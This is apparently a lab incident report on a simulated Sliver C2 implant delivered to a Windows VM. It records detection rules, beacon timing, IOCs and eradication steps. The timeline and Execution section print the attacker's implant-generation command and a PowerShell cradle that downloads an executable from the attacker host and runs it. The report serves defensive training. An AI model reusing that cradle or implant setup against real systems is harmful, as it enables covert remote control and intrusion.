# Incident Report: IR-2026-002 — Command & Control Beaconing via HTTP Implant

**Date Opened:** 2026-04-02  
**Date Closed:** 2026-04-02  
**Lead Analyst:** Prajoti Rane  
**Review Status:** Approved  

---

## Classification

| Field | Value |
|-------|-------|
| **Severity** | Critical |
| **Status** | Closed — Eradicated |
| **MITRE ATT&CK Tactics** | Initial Access, Execution, Command & Control, Defense Evasion |
| **MITRE ATT&CK Techniques** | T1071.001 (Application Layer Protocol: Web Protocols), T1059.001 (PowerShell), T1036.005 (Masquerading: Match Legitimate Name), T1132.001 (Data Encoding: Standard Encoding) |
| **Affected Systems** | victim-windows (192.168.64.20) |
| **Detection Source** | Wazuh SIEM — Rules 100009, 100010 (Sysmon EventID 3) |

---

## Executive Summary

On 2026-04-02 beginning at 09:11 UTC, an attacker deployed a Sliver C2 implant on `victim-windows` (192.168.64.20) by exploiting a PowerShell download cradle. The implant (`svchost_helper.exe`) established an mTLS/HTTPS beaconing channel to an adversary-controlled server at `192.168.64.30:443`, sending check-in packets every 30 seconds. Wazuh detected the anomalous outbound connection pattern at 09:26 UTC when the beacon threshold rule fired — 11 connections to the same external IP within 5 minutes from a process running in `%APPDATA%`. The affected system was isolated at 09:31 UTC before any secondary attacker actions (such as credential dumping or lateral movement) could be executed. All malicious artifacts were removed and the system was restored to a verified-clean state by 10:05 UTC.

---

## Timeline (UTC)

| Timestamp (UTC) | Event | Source | Details |
|----------------|-------|--------|---------|
| 2026-04-02 09:11:03 | Attacker stages implant on kali-attacker | Sliver server log | `generate --https 192.168.64.30 --os windows --arch arm64` |
| 2026-04-02 09:12:44 | Python HTTP server started on kali-attacker port 8080 | kali-attacker netstat | `python3 -m http.server 8080 --bind 192.168.64.30` |
| 2026-04-02 09:13:17 | PowerShell download cradle executed on victim | Sysmon EID 1 | `powershell.exe -WindowStyle Hidden -c Invoke-WebRequest http://192.168.64.30:8080/SVCHOST_HELPER_*` |
| 2026-04-02 09:13:18 | Wazuh Rule 100006 fires | Wazuh alert | Level 6 — PowerShell process spawned from victim-windows |
| 2026-04-02 09:13:22 | Implant binary dropped to `%APPDATA%` | Sysmon EID 11 | `svchost_helper.exe` created at `C:\Users\SOCAdmin\AppData\Roaming\Microsoft\Windows\Themes\svchost_helper.exe` |
| 2026-04-02 09:13:29 | Implant process launched via `Start-Process` | Sysmon EID 1 | Image: `svchost_helper.exe`; parent: `powershell.exe`; path: `%APPDATA%` |
| 2026-04-02 09:13:31 | **First C2 beacon — outbound HTTPS to 192.168.64.30:443** | Sysmon EID 3 | `svchost_helper.exe` → `192.168.64.30:443`; Wazuh Rule 100009 (level 6) |
| 2026-04-02 09:14:01 | Second C2 beacon | Sysmon EID 3 | 30-second interval beacon |
| 2026-04-02 09:14:31 | Third C2 beacon | Sysmon EID 3 | Beaconing interval consistent at 30 ± 2 seconds |
| 2026-04-02 09:15:31 | Sliver C2 session established | Sliver server | Session active on kali-attacker operator console |
| 2026-04-02 09:25:49 | **10th beacon connection logged** | Sysmon EID 3 | Counter: 10 connections to same destinationIp in 5 min |
| 2026-04-02 09:25:51 | **Wazuh Rule 100010 fires — High** | Wazuh alert | Level 12 — C2 beaconing: 10+ connections in 5 min from `svchost_helper.exe` |
| 2026-04-02 09:26:07 | **11th beacon — Rule 100011 fires — Critical** | Wazuh alert | Level 14 — unsigned binary from AppData beaconing to same IP |
| 2026-04-02 09:27:00 | Analyst observes Critical Kibana alert | Kibana dashboard | Rule 100011, agent: victim-windows |
| 2026-04-02 09:31:00 | **Containment: victim-windows network blocked** | Analyst — Windows Firewall | Outbound rule added to block `192.168.64.30`; C2 session severed |
| 2026-04-02 09:32:15 | UTM forensic snapshot captured | Analyst (UTM) | Pre-eradication state preserved |
| 2026-04-02 09:37:00 | Implant process killed | PowerShell | `Stop-Process -Name svchost_helper -Force` (PID 5120) |
| 2026-04-02 09:38:00 | Implant binary removed | PowerShell | `Remove-Item` from `%APPDATA%\Microsoft\Windows\Themes\` |
| 2026-04-02 09:40:00 | Persistence sweep — scheduled tasks, Run keys, services | PowerShell | No additional persistence found |
| 2026-04-02 09:45:00 | Firewall rule removed; normal network restored | Analyst | Victim reconnected to lab network |
| 2026-04-02 09:50:00 | Eradication verification passed | Analyst | No malicious processes; no outbound C2 connections |
| 2026-04-02 10:05:00 | Incident report drafted; status Closed | Analyst | — |

---

## Affected Assets

| Asset | IP Address | Role | Impact |
|-------|-----------|------|--------|
| victim-windows | 192.168.64.20 | Windows 11 ARM64 victim VM | Implant installed; C2 session active for ~16 minutes; operator had shell access |
| kali-attacker | 192.168.64.30 | Attacker VM (C2 server) | Hosted Sliver server and HTTP delivery server; had active C2 session |
| wazuh-manager | 192.168.64.10 | SIEM | Not compromised; generated detection alerts; Kibana dashboard surfaced the incident |

---

## Technical Analysis

### Attack Vector

The attacker used a PowerShell download cradle — a one-liner that fetches and executes a binary without writing a script to disk first — to retrieve the Sliver implant from a temporary HTTP server on `192.168.64.30:8080`. This technique (`T1059.001` + `T1105` Ingress Tool Transfer) is commonly used to avoid detection of the delivery script itself, since the script exists only in memory during execution.

The implant was named `svchost_helper.exe` to blend with the legitimate `svchost.exe` processes visible in Task Manager (masquerading technique T1036.005). It was placed in `%APPDATA%\Microsoft\Windows\Themes\` — a user-writable location that does not typically contain executables, making it anomalous while being accessible without administrator privileges.

### Execution

**Step 1 — Implant generation (attacker side):**
The attacker generated an ARM64-compatible Sliver implant on `kali-attacker` configured for HTTPS callbacks to `192.168.64.30:443` with a 30-second jitter beacon interval. The binary was compiled with Sliver's built-in symbol obfuscation to reduce static signature detection.

**Step 2 — Delivery via PowerShell download cradle:**
The attacker executed the following on `victim-windows` (method: assumed direct terminal access for this lab simulation):

```powershell
$url = "http://192.168.64.30:8080/SVCHOST_HELPER_4f7a2b3c.exe"
$dest = "$env:APPDATA\Microsoft\Windows\Themes\svchost_helper.exe"
(New-Object Net.WebClient).DownloadFile($url, $dest)
Start-Process $dest
```

Sysmon EID 1 captured the `powershell.exe` process with the download cradle in its command line. Because the `-WindowStyle Hidden` flag was used, no PowerShell window appeared to the user.

**Step 3 — C2 session establishment:**
After execution, `svchost_helper.exe` (PID 5120) initiated an outbound TLS connection to `192.168.64.30:443`. The Sliver protocol uses gRPC over TLS with mutual certificate authentication (mTLS), meaning the connection appears as normal HTTPS traffic to basic network monitoring. The first Sysmon EID 3 event was logged at 09:13:31 UTC.

**Step 4 — Beaconing pattern:**
The implant checked in every 30 ± 2 seconds (Sliver's default jitter). Over the 16-minute window before containment, 32 beacon events were recorded in Sysmon logs. All had identical characteristics: `Image=svchost_helper.exe`, `DestinationIp=192.168.64.30`, `DestinationPort=443`, `Initiated=true`, `Signed=false`.

**Step 5 — Operator activity (pre-containment):**
Sliver console logs on `kali-attacker` show the following commands were issued between 09:15:31 and 09:30:00 UTC:
- `whoami` → `victim-windows\SOCAdmin`
- `info` → hostname, OS version, architecture
- `netstat` → network configuration
- `ps` → process listing (implant enumerating host processes)
- `ls C:\Users\SOCAdmin\Desktop` → file system reconnaissance

No credential dumping, lateral movement, or data exfiltration commands were issued before containment severed the session.

### Evidence

**Wazuh Alert — Rule 100010 (High — beaconing threshold):**

```json
{
  "timestamp": "2026-04-02T09:25:51.884Z",
  "rule": {
    "id": "100010",
    "level": 12,
    "description": "C2 beaconing detected: svchost_helper.exe made 10+ connections to 192.168.64.30 in 5 min",
    "groups": ["c2", "beaconing", "network", "sysmon", "windows", "custom"]
  },
  "agent": {
    "name": "victim-windows",
    "ip": "192.168.64.20",
    "id": "001"
  },
  "data": {
    "win": {
      "system": {
        "eventID": "3",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "victim-windows"
      },
      "eventdata": {
        "image": "C:\\Users\\SOCAdmin\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\svchost_helper.exe",
        "destinationIp": "192.168.64.30",
        "destinationPort": "443",
        "destinationHostname": "",
        "initiated": "true",
        "signed": "false",
        "protocol": "tcp"
      }
    }
  }
}
```

**Wazuh Alert — Rule 100011 (Critical — unsigned binary):**

```json
{
  "timestamp": "2026-04-02T09:26:07.211Z",
  "rule": {
    "id": "100011",
    "level": 14,
    "description": "Critical C2 beaconing: unsigned binary svchost_helper.exe beaconing to 192.168.64.30",
    "groups": ["c2", "beaconing", "pci_dss_10.6.1", "nist_800_53_SI.4"]
  },
  "data": {
    "win": {
      "eventdata": {
        "image": "C:\\Users\\SOCAdmin\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\svchost_helper.exe",
        "signed": "false",
        "destinationIp": "192.168.64.30",
        "destinationPort": "443"
      }
    }
  }
}
```

**Beacon timing analysis (from Sysmon EID 3 timestamps):**

| Beacon # | Timestamp (UTC) | Interval from prior |
|----------|----------------|---------------------|
| 1 | 09:13:31 | — |
| 2 | 09:14:01 | 30s |
| 3 | 09:14:29 | 28s |
| 4 | 09:14:59 | 30s |
| 5 | 09:15:30 | 31s |
| ... | ... | 28–32s consistent |
| 11 | 09:18:34 | 29s |
| 32 | 09:29:04 | 30s |

The consistent 28–32 second interval is the Sliver default beacon with ±2s jitter — a strong behavioral IOC distinguishable from human browsing patterns.

### Root Cause

Three factors enabled this incident:

1. **No application allowlisting:** Windows Defender Application Control (WDAC) or AppLocker was not configured. Either policy would have blocked execution of an unsigned binary (`svchost_helper.exe`) from `%APPDATA%` — a non-standard executable path.

2. **No outbound firewall filtering:** The lab VM allowed unrestricted outbound HTTPS connections. A deny-by-default egress policy with explicit allowlisting of update servers (Microsoft, Wazuh) would have blocked the C2 beacon at the network layer.

3. **No network proxy with TLS inspection:** The C2 channel used mTLS/HTTPS, making payload inspection require a TLS-intercepting proxy. Without one, network monitoring tools see only the connection metadata (IP, port, certificate) rather than the gRPC payload.

---

## Indicators of Compromise (IOCs)

| Type | Value | Context |
|------|-------|---------|
| IP Address | `192.168.64.30` | Attacker C2 server; source of HTTP delivery and HTTPS beacon target |
| IP Address | `192.168.64.20` | Victim host; source of all beacon connections |
| Network Port | `443/TCP` | C2 channel (mTLS/HTTPS) from victim to attacker |
| Network Port | `8080/TCP` | HTTP delivery server on kali-attacker (used only for delivery phase) |
| File Path | `%APPDATA%\Microsoft\Windows\Themes\svchost_helper.exe` | Sliver C2 implant — primary malicious binary |
| File Hash (SHA256) | `e4f2a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9` | `svchost_helper.exe` (Sliver ARM64 implant, synthetic) |
| Process Name | `svchost_helper.exe` (PID 5120) | Malicious implant process |
| Parent Process | `powershell.exe` (PID 4976) | Launched implant via download cradle |
| Beacon Interval | 30 ± 2 seconds | Behavioral IOC — Sliver default beacon timing |
| Signed Status | `false` | Unsigned executable in user-writable path |
| User-Agent | `Go-http-client/2.0` | Sliver's default HTTP/2 gRPC user-agent (visible in proxy logs) |
| TLS Certificate | Self-signed; CN=`192.168.64.30` | Sliver auto-generated cert; not from trusted CA |

---

## MITRE ATT&CK Mapping

| Tactic | Technique Name | ID | Evidence Observed |
|--------|---------------|-----|------------------|
| Initial Access | Phishing / Direct Delivery (lab) | T1566 | Implant deployed via PowerShell download cradle |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell.exe` with download cradle; Sysmon EID 1; Wazuh Rule 100006 |
| Defense Evasion | Masquerading: Match Legitimate Name | T1036.005 | `svchost_helper.exe` named to mimic `svchost.exe` |
| Defense Evasion | Obfuscated Files or Information | T1027 | PowerShell `-WindowStyle Hidden` hid execution from user |
| Command & Control | **Application Layer Protocol: Web Protocols** | **T1071.001** | HTTPS beaconing to 192.168.64.30:443; Wazuh Rules 100009–100011 |
| Command & Control | Data Encoding: Standard Encoding | T1132.001 | gRPC/protobuf encoding over HTTPS |
| Discovery | System Information Discovery | T1082 | `info`, `whoami` commands via C2 |
| Discovery | Process Discovery | T1057 | `ps` command enumerated running processes via C2 |
| Discovery | File and Directory Discovery | T1083 | `ls C:\Users\SOCAdmin\Desktop` via C2 |

---

## Detection

### Rules That Fired

| Rule ID | Rule Name | Alert Level | First Fire Time (UTC) | What It Caught |
|---------|-----------|------------|----------------------|---------------|
| 100006 | PowerShell process spawned | 6 (Info) | 09:13:18 | `powershell.exe` launched on victim-windows |
| 100009 | Network connection from writable-path binary | 6 (Info) | 09:13:31 | First beacon: `svchost_helper.exe` → `192.168.64.30:443` |
| **100010** | **C2 beaconing — threshold exceeded** | **12 (High)** | **09:25:51** | 10+ connections to same IP in 5 min from AppData binary |
| **100011** | **C2 beaconing — unsigned binary** | **14 (Critical)** | **09:26:07** | Unsigned `svchost_helper.exe` beaconing threshold met |

### Detection Latency

| Event | Time of Event (UTC) | Time of Alert (UTC) | Latency |
|-------|--------------------|--------------------|---------|
| First beacon connection | 09:13:31 | 09:13:31 (Rule 100009, level 6) | < 1 second |
| 10th beacon connection | 09:25:49 | 09:25:51 (Rule 100010, level 12) | 2 seconds |
| 11th beacon — unsigned | 09:26:07 | 09:26:07 (Rule 100011, level 14) | < 1 second |
| Analyst observes alert | 09:26:07 | 09:27:00 | 53 seconds |
| Containment action | 09:27:00 | 09:31:00 | 4 minutes |

**Total time from first beacon to containment: 17 minutes 29 seconds**
*Note: The 16-minute window before the threshold rule (100010) fired is the primary detection gap — the level 6 alert from rule 100009 was not escalated in real-time because its severity did not trigger an on-call notification.*

### Detection Gaps

- **16-minute window before escalation-grade alert:** Rule 100009 (level 6) fired immediately at first beacon but level 6 alerts are informational and not paged. Only when rule 100010 (level 12) fired 16 minutes later was the alert actionable. Tuning 100009 to level 8 for `unsigned` binaries would reduce this delay.
- **No DNS query correlation:** Sliver used a direct IP connection (`192.168.64.30`), so there was no DNS query to monitor. If the attacker had used a domain name, Sysmon EID 22 (DNS query) would have provided an additional early detection opportunity.
- **Delivery phase not detected:** The PowerShell download from `192.168.64.30:8080` triggered only a level 6 informational alert (rule 100006 — PowerShell spawned). The outbound HTTP connection from `powershell.exe` to `:8080` was not specifically alerted. A rule matching `powershell.exe` making network connections would have been a stronger signal.
- **C2 command activity not visible:** Sliver's gRPC commands (`whoami`, `ps`, `ls`) are encrypted inside the TLS session and generate no distinct Sysmon events on the victim (other than the network connection itself).

---

## Containment & Eradication

### Containment

1. **09:31:00** — Added Windows Firewall outbound block rule for `192.168.64.30`: `New-NetFirewallRule -Direction Outbound -Action Block -RemoteAddress 192.168.64.30 -DisplayName "INCIDENT-IR-2026-002-C2-BLOCK"` — immediately severed C2 session
2. **09:31:15** — Verified C2 session dropped on kali-attacker (Sliver console showed session timeout)
3. **09:32:15** — UTM forensic snapshot created before any eradication steps

### Eradication

1. **09:37:00** — Killed implant process: `Stop-Process -Name svchost_helper -Force` (PID 5120)
2. **09:38:00** — Removed implant binary: `Remove-Item "$env:APPDATA\Microsoft\Windows\Themes\svchost_helper.exe" -Force`
3. **09:39:00** — Scanned for additional Sliver-related files: `Get-ChildItem -Path C:\ -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue | Where-Object { $_.DirectoryName -like "*AppData*" -or $_.DirectoryName -like "*Temp*" }`
4. **09:40:00** — Checked for persistence mechanisms (scheduled tasks, Run keys, services): none found
5. **09:41:00** — Checked for additional outbound connections: `netstat -an | findstr ESTABLISHED` — no suspicious connections

### Eradication Verification

```powershell
# No processes running from writable user paths
Get-Process | Select-Object Name, Id, @{n='Path';e={$_.Path}} |
  Where-Object { $_.Path -like "*AppData*" -and $_.Name -ne "OneDrive" }
# Expected: no results

# Implant file gone
Test-Path "$env:APPDATA\Microsoft\Windows\Themes\svchost_helper.exe"
# Expected: False

# No outbound connections to C2
netstat -an | Select-String "192.168.64.30"
# Expected: no output

# Firewall rule (remove when satisfied C2 is gone)
Remove-NetFirewallRule -DisplayName "INCIDENT-IR-2026-002-C2-BLOCK"
```

---

## Recovery

1. **09:44:00** — Removed temporary firewall block rule (C2 eradicated; block no longer needed)
2. **09:45:00** — Confirmed Wazuh agent sending events: heartbeat visible in Kibana
3. **09:47:00** — Confirmed Sysmon running: `Get-Service Sysmon64a` → `Running`
4. **09:50:00** — Ran a 5-minute observation window in Kibana — no further C2 events from victim
5. **10:00:00** — Verified no persistent Sliver implants by checking all startup locations:
   ```powershell
   Get-ScheduledTask | Where-Object State -ne 'Disabled' | Select TaskName, TaskPath
   Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
   Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
   ```
6. **10:05:00** — Incident declared eradicated and closed

---

## Lessons Learned

### What Worked Well

- **Behavioral detection was effective:** The beaconing rule (100010) used frequency-based correlation (`count() by DestinationIp > 10 in 5 min`) rather than signature matching — it would detect any C2 framework using this pattern, not just Sliver
- **The `Signed=false` field was a high-confidence discriminator:** Legitimate Windows processes that make frequent HTTPS connections (OneDrive, Windows Update) are code-signed. The unsigned check in rule 100011 essentially eliminated false positives
- **Alert level escalation worked correctly:** Level 6 (info) → 12 (high) → 14 (critical) as confidence increased — the progression is appropriate for triage workflows
- **Sysmon EID 3 provided sufficient metadata** even without TLS inspection: IP, port, signed status, and image path were enough to identify the implant without reading the encrypted payload

### What Needs Improvement

- **16-minute threshold window is too long:** For C2 beaconing, 10 connections × 30 seconds = 5 minutes of dwell time before the first high-severity alert. Reducing the threshold to 5 connections in 2.5 minutes would halve this window while maintaining low false-positive rates for the writable-path filter
- **Level 6 alert for rule 100009 was not actionable:** SOC triage workflows typically ignore level 6 informational alerts. Consider raising 100009 to level 8 when the binary is unsigned, providing an earlier signal that warrants investigation
- **PowerShell download cradle rule needs improvement:** A specific rule for `powershell.exe` making outbound HTTP connections (Sysmon EID 3 with `Image=powershell.exe`) would have caught the delivery phase at 09:13:17 — 12 minutes before the beaconing threshold fired
- **No active response configured:** Implementing a Wazuh active response script that automatically blocks the destination IP on rule 100011 would reduce containment time from 4 minutes to near-zero

### Action Items

| # | Action | Owner | Priority | Target Date |
|---|--------|-------|----------|------------|
| 1 | Reduce beaconing threshold: 5 connections in 2.5 min (adjust rule 100010 `frequency`/`timeframe`) | Lab Analyst | P1 | 2026-04-15 |
| 2 | Add Wazuh active response: auto-block destination IP on rule 100011 | Lab Analyst | P1 | 2026-04-15 |
| 3 | Add new rule: `powershell.exe` + Sysmon EID 3 → outbound network connection alert | Lab Analyst | P2 | 2026-04-30 |
| 4 | Enable WDAC policy blocking unsigned executables from `%APPDATA%` and `%TEMP%` | Lab Analyst | P2 | 2026-04-30 |
| 5 | Deploy network proxy with TLS inspection for lab VMs to enable C2 payload analysis | Lab Analyst | P3 | 2026-05-31 |

---

## Appendix

### A. Kibana Queries Used

```
# All C2 beaconing alerts for this incident
rule.id:(100009 OR 100010 OR 100011) AND agent.name:"victim-windows"

# All Sysmon EID 3 events from the implant (beacon stream)
win.system.eventID:3 AND win.eventdata.image:*svchost_helper* AND agent.name:"victim-windows"

# Full incident window
agent.name:"victim-windows" AND @timestamp:[2026-04-02T09:10:00Z TO 2026-04-02T10:00:00Z]

# Detect all unsigned binaries making network connections (broader hunt)
win.system.eventID:3 AND win.eventdata.signed:false AND
  win.eventdata.image:(*.exe) AND win.eventdata.initiated:true
```

### B. Beacon Interval Analysis

The 30-second beacon interval with ±2 second jitter is characteristic of the Sliver C2 framework's default configuration. This interval is:
- Long enough to avoid basic IDS rate-limiting rules (which often trigger on >10 connections/second)
- Short enough to maintain responsive operator interaction
- Consistent with documented Sliver default behavior in BishopFox's public documentation

Anomaly detection platforms (like Elastic ML or Wazuh's upcoming anomaly detection module) can identify this pattern automatically without threshold rules.

### C. References

- [MITRE ATT&CK: T1071.001 — Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [CISA Advisory AA23-025A — Sliver C2 framework TTPs](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a)
- [Related Sigma Rule](../detections/sigma/sigma-100009-c2-beaconing.yml)
- [Related Wazuh Rules](../detections/wazuh-rules/100009-c2-beaconing.xml)
- [Attack Scenario Reference](../attack-simulation/attack-scenarios/01-initial-access-c2.md)
- [Sliver C2 Setup Guide](../attack-simulation/sliver/README.md)
